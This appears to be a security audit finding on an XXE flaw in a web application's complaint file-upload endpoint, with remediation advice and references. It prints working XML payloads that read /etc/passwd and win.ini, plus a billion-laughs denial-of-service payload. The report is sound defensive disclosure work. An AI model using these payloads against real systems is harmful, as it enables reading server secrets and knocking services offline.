# 03 — XXE: External Entity Data Access

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **CVSS 3.1** | 9.1 (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:H`) |
| **Category** | Injection / XML External Entities (OWASP A03:2021) |
| **Endpoint** | `POST /file-upload` (complaint attachment) |

## Summary

The complaint/file-upload feature parses uploaded XML files with an XML parser that resolves external entities. By submitting a crafted XML document containing a `DOCTYPE` with an external entity, an attacker can read arbitrary files from the server's filesystem (local file disclosure) and, depending on parser configuration, reach internal services or cause denial of service.

## Impact

- Disclosure of sensitive local files (`/etc/passwd`, config files, secrets).
- Potential SSRF to internal endpoints.
- Denial of service (billion-laughs / entity expansion).

## Steps to reproduce

1. Authenticate and navigate to the **Complaint** page (`/#/complain`), which allows a file attachment.
2. Create a malicious XML file, `xxe.xml`:

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <comment>&xxe;</comment>
   ```

3. Upload the file as the complaint attachment.
4. The parser resolves `&xxe;` and reflects the file contents in the response or error message, disclosing `/etc/passwd`.

On Windows targets, substitute:

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
```

### Denial-of-service variant (billion laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<comment>&lol3;</comment>
```

## Root cause

The XML parser is instantiated with default settings that allow `DOCTYPE` declarations and external entity resolution. No allowlist restricts the uploaded file types or content.

## Remediation

- **Disable DTDs and external entities** in the XML parser (the single most effective fix):

  ```js
  // libxmljs example
  libxml.parseXml(data, { noent: false, dtdload: false, nonet: true })
  ```

- Prefer less complex data formats (JSON) where possible.
- Validate and restrict uploaded file types.
- Run parsing with least privilege and network egress restrictions.

## References

- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [CWE-611](https://cwe.mitre.org/data/definitions/611.html)
